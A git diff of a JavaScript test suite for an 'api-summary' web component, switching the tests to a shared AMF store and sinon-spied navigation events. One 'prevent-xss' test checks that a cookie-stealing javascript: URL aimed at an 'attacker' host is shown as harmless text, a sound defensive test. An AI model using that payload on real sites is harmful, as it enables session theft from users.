@@ -1,25 +1,29 @@
 import { fixture, assert, nextFrame, html, aTimeout } from '@open-wc/testing';
+import sinon from 'sinon';
 import { endpointsValue } from '../../src/elements/ApiSummaryElement.js';
 import { AmfLoader } from '../AmfLoader.js';
-import '../../api-summary.js';
+import '../../define/api-summary.js';
+import { EventTypes } from '../../src/events/EventTypes.js';
+import { DomEventsAmfStore } from '../../src/store/DomEventsAmfStore.js';
 
 /** @typedef {import('../../').ApiSummaryElement} ApiSummaryElement */
-/** @typedef {import('@api-components/amf-helper-mixin').AmfDocument} AmfDocument */
-/** @typedef {import('@api-components/amf-helper-mixin').DomainElement} DomainElement */
+/** @typedef {import('../../src/helpers/amf').AmfDocument} AmfDocument */
+/** @typedef {import('../../src/helpers/amf').DomainElement} DomainElement */
+/** @typedef {import('../../src/events/NavigationEvents').ApiNavigationEvent} ApiNavigationEvent */
 
 describe('ApiSummaryElement', () => {
   const loader = new AmfLoader();
+  const store = new DomEventsAmfStore(window);
+  store.listen();
 
   /**
-   * @param {AmfDocument} amf
    * @returns {Promise<ApiSummaryElement>}
    */
-  async function modelFixture(amf) {
+  async function modelFixture() {
     const element = await fixture(html`<api-summary 
-      .queryDebouncerTimeout="${0}" 
-      .amf="${amf}"
+      .queryDebouncerTimeout="${0}"
     ></api-summary>`);
-    await aTimeout(0);
+    await aTimeout(1);
     return /** @type ApiSummaryElement */ (element);
   }
 
@@ -30,12 +34,13 @@ describe('ApiSummaryElement', () => {
         let model;
         before(async () => {
           model = await loader.getGraph(compact);
+          store.amf = model;
         });
 
         /** @type ApiSummaryElement */
         let element;
         beforeEach(async () => {
-          element = await modelFixture(model);
+          element = await modelFixture();
         });
 
         it('renders api title', () => {
@@ -44,7 +49,7 @@ describe('ApiSummaryElement', () => {
             <label part="api-title-label">
               API title:
             </label>
-            <span>
+            <span class="text-selectable">
               API body demo
             </span>
           </div>`);
@@ -52,7 +57,7 @@ describe('ApiSummaryElement', () => {
 
         it('renders version', () => {
           const node = element.shadowRoot.querySelector('.inline-description.version span');
-          assert.dom.equal(node, '<span>v1</span>');
+          assert.dom.equal(node, '<span class="text-selectable">v1</span>');
         });
 
         it('renders protocols', () => {
@@ -60,10 +65,10 @@ describe('ApiSummaryElement', () => {
           assert.dom.equal(
             node,
             `<div class="protocol-chips">
-            <span class="chip">
+            <span class="chip text-selectable">
                 HTTP
             </span>
-            <span class="chip">
+            <span class="chip text-selectable">
               HTTPS
             </span>
           </div>`
@@ -104,12 +109,13 @@ describe('ApiSummaryElement', () => {
         let model;
         before(async () => {
           model = await loader.getGraph(compact, 'loan-microservice');
+          store.amf = model;
         });
 
         /** @type ApiSummaryElement */
         let element;
         beforeEach(async () => {
-          element = await modelFixture(model);
+          element = await modelFixture();
         });
         
 
@@ -120,14 +126,14 @@ describe('ApiSummaryElement', () => {
 
         it('renders provider name', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
-          assert.dom.equal(node, `<span class="provider-name">John Becker</span>`);
+          assert.dom.equal(node, `<span class="provider-name text-selectable">John Becker</span>`);
         });
 
         it('renders provider email', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
           assert.dom.equal(
             node,
-            `<a class="app-link link-padding provider-email" href="mailto:JohnBecker@cognizant.com">
+            `<a class="app-link link-padding provider-email text-selectable" href="mailto:JohnBecker@cognizant.com">
             JohnBecker@cognizant.com
           </a>`
           );
@@ -137,7 +143,7 @@ describe('ApiSummaryElement', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
           assert.dom.equal(
             node,
-            `<a class="app-link provider-url" href="http://domain.com" target="_blank">http://domain.com</a>`
+            `<a class="app-link provider-url text-selectable" href="http://domain.com" target="_blank">http://domain.com</a>`
           );
         });
 
@@ -150,7 +156,7 @@ describe('ApiSummaryElement', () => {
           const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
           assert.dom.equal(
             node,
-            `<a class="app-link" href="https://www.apache.org/licenses/LICENSE-2.0.html" target="_blank">
+            `<a class="app-link text-selectable" href="https://www.apache.org/licenses/LICENSE-2.0.html" target="_blank">
             Apache 2.0
           </a>`
           );
@@ -167,12 +173,13 @@ describe('ApiSummaryElement', () => {
         let model;
         before(async () => {
           model = await loader.getGraph(compact, 'prevent-xss');
+          store.amf = model;
         });
 
         /** @type ApiSummaryElement */
         let element;
         beforeEach(async () => {
-          element = await modelFixture(model);
+          element = await modelFixture();
         });
 
         it('provider section is rendered', () => {
@@ -182,14 +189,14 @@ describe('ApiSummaryElement', () => {
 
         it('renders provider name', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
-          assert.dom.equal(node, `<span class="provider-name">Wally</span>`);
+          assert.dom.equal(node, `<span class="provider-name text-selectable">Wally</span>`);
         });
 
         it('renders provider email', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
           assert.dom.equal(
             node,
-            `<a class="app-link link-padding provider-email" href="mailto:wallythebest@wally.com">
+            `<a class="app-link link-padding provider-email text-selectable" href="mailto:wallythebest@wally.com">
             wallythebest@wally.com
           </a>`
           );
@@ -199,7 +206,7 @@ describe('ApiSummaryElement', () => {
           const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
           assert.dom.equal(
             node,
-            `<a class="app-link provider-url" target="_blank">
+            `<a class="app-link provider-url text-selectable" target="_blank">
               javascript:window.location='http://attacker/?cookie='+document.cookie</a>`
           );
         });
@@ -213,7 +220,7 @@ describe('ApiSummaryElement', () => {
           const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
           assert.dom.equal(
             node,
-            `<a class="app-link" target="_blank">
+            `<a class="app-link text-selectable" target="_blank">
             I swear if you click below you will have the most amazing experience ever. I promise.
           </a>`
           );
@@ -230,12 +237,13 @@ describe('ApiSummaryElement', () => {
         let model;
         before(async () => {
           model = await loader.getGraph(compact);
+          store.amf = model;
         });
 
         /** @type ApiSummaryElement */
         let element;
         beforeEach(async () => {
-          element = await modelFixture(model);
+          element = await modelFixture();
         });
 
         it('adds separator', () => {
@@ -253,8 +261,8 @@ describe('ApiSummaryElement', () => {
           assert.dom.equal(
             node,
             `<a
-              class="endpoint-path"
-              data-shape-type="endpoint"
+              class="endpoint-path text-selectable"
+              data-shape-type="resource"
               href="#/people"
               title="Open endpoint documentation"
               >
@@ -288,57 +296,63 @@ describe('ApiSummaryElement', () => {
           assert.lengthOf(nodes, 4);
         });
 
-        it('renders operation method', () => {
+        it('renders an operation', () => {
           const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.method-label');
           assert.dom.equal(
             node,
             `<a
               class="method-label"
               data-method="get"
-              data-shape-type="method"
+              data-shape-type="operation"
               href="#/people/get"
               title="Open method documentation"
               >get</a>`,
             {
-              ignoreAttributes: ['data-id']
+              ignoreAttributes: ['data-id', 'data-parent']
             }
           );
         });
 
-        it('dispatches the navigation event from the endpoint node', (done) => {
+        it('dispatches the navigation event from the endpoint node', () => {
+          const spy = sinon.spy();
+          element.addEventListener(EventTypes.Navigation.apiNavigate, spy);
+
           const node = element.shadowRoot.querySelector(`.endpoint-path[data-id]`);
-          element.addEventListener('api-navigation-selection-changed', (e) => {
-            // @ts-ignore
-            const {detail} = e;
-            assert.typeOf(detail.selected, 'string');
-            assert.equal(detail.type, 'endpoint');
-            done();
-          });
           /** @type HTMLElement */ (node).click();
+
+          assert.isTrue(spy.calledOnce, 'the event is dispatched');
+          const e = /** @type ApiNavigationEvent */ (spy.args[0][0]);
+          const { detail } = e;
+          assert.typeOf(detail.domainId, 'string');
+          assert.equal(detail.domainType, 'resource');
         });
 
-        it('dispatches the navigation event from the endpoint path', (done) => {
+        it('dispatches the navigation event from the endpoint path', () => {
+          const spy = sinon.spy();
+          element.addEventListener(EventTypes.Navigation.apiNavigate, spy);
+
           const node = element.shadowRoot.querySelector(`.endpoint-path[data-id]`);
-          element.addEventListener('api-navigation-selection-changed', (e) => {
-            // @ts-ignore
-            const {detail} = e;
-            assert.typeOf(detail.selected, 'string');
-            assert.equal(detail.type, 'endpoint');
-            done();
-          });
           /** @type HTMLElement */ (node).click();
+
+          assert.isTrue(spy.calledOnce, 'the event is dispatched');
+          const e = /** @type ApiNavigationEvent */ (spy.args[0][0]);
+          const { detail } = e;
+          assert.typeOf(detail.domainId, 'string');
+          assert.equal(detail.domainType, 'resource');
         });
 
-        it('dispatches the navigation event from the operation click', (done) => {
+        it('dispatches the navigation event from the operation click', () => {
+          const spy = sinon.spy();
+          element.addEventListener(EventTypes.Navigation.apiNavigate, spy);
+
           const node = element.shadowRoot.querySelector(`.method-label[data-id]`);
-          element.addEventListener('api-navigation-selection-changed', (e) => {
-            // @ts-ignore
-            const {detail} = e;
-            assert.typeOf(detail.selected, 'string');
-            assert.equal(detail.type, 'method');
-            done();
-          });
           /** @type HTMLElement */ (node).click();
+
+          assert.isTrue(spy.calledOnce, 'the event is dispatched');
+          const e = /** @type ApiNavigationEvent */ (spy.args[0][0]);
+          const { detail } = e;
+          assert.typeOf(detail.domainId, 'string');
+          assert.equal(detail.domainType, 'operation');
         });
       });
 
@@ -359,25 +373,29 @@ describe('ApiSummaryElement', () => {
         });
 
         it('renders URL area with a single server', async () => {
-          const element = await modelFixture(ramlSingleServerAmf);
+          store.amf = ramlSingleServerAmf;
+          const element = await modelFixture();
           const node = element.shadowRoot.querySelector('.endpoint-url');
           assert.ok(node);
         });
 
         it('renders single server URL', async () => {
-          const element = await modelFixture(ramlSingleServerAmf);
+          store.amf = ramlSingleServerAmf;
+          const element = await modelFixture();
           const node = element.shadowRoot.querySelector('.url-value');
           assert.equal(node.textContent.trim(), 'http://{instance}.domain.com');
         });
 
         it('renders multiple servers', async () => {
-          const element = await modelFixture(oasMultipleServersAmf);
+          store.amf = oasMultipleServersAmf;
+          const element = await modelFixture();
           const node = element.shadowRoot.querySelector('.servers');
           assert.ok(node);
         });
 
         it('renders multiple URLs', async () => {
-          const element = await modelFixture(oasMultipleServersAmf);
+          store.amf = oasMultipleServersAmf;
+          const element = await modelFixture();
           const nodes = element.shadowRoot.querySelectorAll('.server-lists li');
           assert.lengthOf(nodes, 4, 'has 4 servers');
           assert.equal(nodes[0].textContent.trim(), 'https://{customerId}.saas-app.com:{port}/v2');
@@ -387,7 +405,8 @@ describe('ApiSummaryElement', () => {
         });
 
         it('does not render URL area when no servers', async () => {
-          const element = await modelFixture(noServersAmf);
+          store.amf = noServersAmf;
+          const element = await modelFixture();
           const urlNode = element.shadowRoot.querySelector('.url-area');
           assert.notOk(urlNode);
           const serversNode = element.shadowRoot.querySelector('.servers');
@@ -395,7 +414,8 @@ describe('ApiSummaryElement', () => {
         });
 
         it('renders multiple URLs with descriptions', async () => {
-          const element = await modelFixture(oasMultipleServersWithDescriptionAmf);
+          store.amf = oasMultipleServersWithDescriptionAmf;
+          const element = await modelFixture();
           const nodes = element.shadowRoot.querySelectorAll('.server-lists li');
           assert.lengthOf(nodes, 4, 'has 4 servers');
           assert.equal(nodes[0].textContent.trim(), 'https://api.aws-west-prd.capgroup.com/cdp-proxy/profiles');
@@ -410,16 +430,15 @@ describe('ApiSummaryElement', () => {
       });
 
       describe('AsyncAPI', () => {
-        /** @type AmfDocument */
-        let model;
         before(async () => {
-          model = await loader.getGraph(compact, 'async-api');
+          const model = await loader.getGraph(compact, 'async-api');
+          store.amf = model;
         });
 
         /** @type ApiSummaryElement */
         let element;
         beforeEach(async () => {
-          element = await modelFixture(model);
+          element = await modelFixture();
         });
 
         it('renders server uri for API', () => {
@@ -433,16 +452,15 @@ describe('ApiSummaryElement', () => {
       });
 
       describe('hideToc', () => {
-        /** @type AmfDocument */
-        let model;
         before(async () => {
-          model = await loader.getGraph(compact);
+          const model = await loader.getGraph(compact);
+          store.amf = model;
         });
 
         /** @type ApiSummaryElement */
         let element;
         beforeEach(async () => {
-          element = await modelFixture(model);
+          element = await modelFixture();
           element.setAttribute('hideToc', 'true');
           await nextFrame();
         });
@@ -461,36 +479,36 @@ describe('ApiSummaryElement', () => {
         before(async () => {
           libraryModel = await loader.getGraph(compact, 'APIC-711');
           apiModel = await loader.getGraph(compact);
+          store.amf = apiModel;
         });
 
         /** @type ApiSummaryElement */
         let element;
         beforeEach(async () => {
-          element = await modelFixture(apiModel);
+          element = await modelFixture();
         });
 
         it('clears everything when changing to RAML library', async () => {
-          element.amf = libraryModel;
-          await aTimeout(0);
-          assert.isUndefined(element.summary);
-          assert.isUndefined(element.servers);
-          assert.isUndefined(element[endpointsValue]);
+          store.amf = libraryModel;
+          await aTimeout(2);
+          assert.notOk(element.summary);
+          assert.deepEqual(element.servers, []);
+          assert.deepEqual(element[endpointsValue], []);
         });
       });
     });
   });
 
   describe('a11y', () => {
-    /** @type AmfDocument */
-    let model;
     before(async () => {
-      model = await loader.getGraph(true, 'loan-microservice');
+      const model = await loader.getGraph(true, 'loan-microservice');
+      store.amf = model;
     });
 
     /** @type ApiSummaryElement */
     let element;
     beforeEach(async () => {
-      element = await modelFixture(model);
+      element = await modelFixture();
     });
 
     it('passes accessibility test', async () => {
